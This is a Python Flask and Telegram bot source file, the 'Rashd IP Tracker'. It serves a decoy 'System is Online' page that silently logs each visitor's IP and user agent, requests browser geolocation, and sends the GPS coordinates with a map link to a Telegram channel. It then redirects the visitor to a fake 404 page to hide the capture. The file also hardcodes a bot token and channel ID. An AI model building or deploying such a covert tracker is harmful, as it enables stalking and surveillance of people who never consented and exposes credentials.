import os
import requests
import re
import json
from flask import Flask, request, render_template_string
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

# --- Load environment variables ---
load_dotenv()

TRACKER_BOT_TOKEN = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN")
CHANNEL_ID = "-1003835973914"

# --- Flask App for Uptime & Tracking ---
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Rashd IP Tracker - System Status</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                window.location.href = "/404";
            }
        }
        function showPosition(position) {
            fetch("/log_location", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    ip: "{{ ip }}"
                })
            }).then(() => {
                window.location.href = "/404";
            });
        }
        function showError(error) {
            window.location.href = "/404";
        }
        window.onload = getLocation;
    </script>
</head>
<body>
    <h1>System is Online</h1>
    <p>Rashd IP Tracker Monitoring System 24/7</p>
</body>
</html>
"""

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    # Log IP immediately
    log_to_channel(f"🌐 **New Visitor Detected**\nIP: `{ip}`\nUser-Agent: `{request.user_agent}`")
    return render_template_string(HTML_TEMPLATE, ip=ip)

@app.route("/log_location", methods=["POST"])
def log_location():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    ip = data.get("ip")
    msg = (
        f"📍 **GPS Data Captured**\n"
        f"IP: `{ip}`\n"
        f"Latitude: `{lat}`\n"
        f"Longitude: `{lon}`\n"
        f"Google Maps: [View](https://www.google.com/maps?q={lat},{lon})"
    )
    log_to_channel(msg)
    return "OK", 200

@app.route("/404")
def page_404():
    return "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>", 404

def log_to_channel(message):
    url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHANNEL_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending message to channel: {e}")

def run_flask():
    app.run(host=\'0.0.0.0\', port=8080)

# --- Telegram Bot for Tracker (Optional, for commands if needed) ---
async def start_tracker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hello! I am the Rashd IP Tracker bot. I log IP and GPS data to the channel.")

def main_tracker_bot():
    # Start Flask in a separate thread
    Thread(target=run_flask, daemon=True).start()
    
    app_tg = Application.builder().token(TRACKER_BOT_TOKEN).build()
    app_tg.add_handler(CommandHandler("start", start_tracker))
    
    print("Rashd IP Tracker 🤖 is running with Flask Uptime & Tracking...")
    app_tg.run_polling()

if __name__ == "__main__":
    main_tracker_bot()
